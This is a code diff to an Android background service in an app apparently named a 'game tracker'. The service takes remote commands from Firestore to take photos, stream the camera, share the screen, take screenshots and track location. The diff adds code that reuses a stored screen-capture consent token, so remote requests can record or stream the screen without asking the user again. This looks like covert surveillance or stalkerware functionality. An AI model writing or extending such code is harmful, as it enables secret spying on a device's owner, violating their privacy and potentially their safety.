@@ -12,8 +12,10 @@ import android.os.IBinder
 import android.os.SystemClock
 import androidx.core.app.NotificationCompat
 import com.google.firebase.firestore.DocumentChange
+import com.google.firebase.firestore.FieldValue
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ListenerRegistration
+import com.example.game_tracker.MediaProjectionStore
 
 class ForegroundService : Service() {
 
@@ -174,6 +176,7 @@ class ForegroundService : Service() {
                                     startLocationUpdates()
                                 }
                                 "camera_capture" -> {
+                                    markBackgroundAttempt(requestId)
                                     val svcIntent = Intent(this, CameraCaptureService::class.java).apply {
                                         putExtra("requestId", requestId)
                                         putExtra("cameraFacing", cameraFacing)
@@ -185,10 +188,16 @@ class ForegroundService : Service() {
                                     }
                                 }
                                 "screen_share", "camera_stream" -> {
+                                    markBackgroundAttempt(requestId)
                                     val svcIntent = Intent(this, WebRtcPublisherService::class.java).apply {
                                         putExtra("requestId", requestId)
                                         putExtra("cameraFacing", cameraFacing)
                                         putExtra("requestType", requestType)
+                                        val savedProjection = MediaProjectionStore.load(this@ForegroundService)
+                                        if (savedProjection.first != 0 && savedProjection.second != null) {
+                                            putExtra("resultCode", savedProjection.first)
+                                            putExtra("resultData", savedProjection.second)
+                                        }
                                     }
                                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                         startForegroundService(svcIntent)
@@ -197,9 +206,14 @@ class ForegroundService : Service() {
                                     }
                                 }
                                 "screenshot" -> {
+                                    val savedProjection = MediaProjectionStore.load(this@ForegroundService)
                                     val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
                                         putExtra("requestId", requestId)
                                         putExtra("capture_once", true)
+                                        if (savedProjection.first != 0 && savedProjection.second != null) {
+                                            putExtra("resultCode", savedProjection.first)
+                                            putExtra("resultData", savedProjection.second)
+                                        }
                                     }
                                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                         startForegroundService(svcIntent)
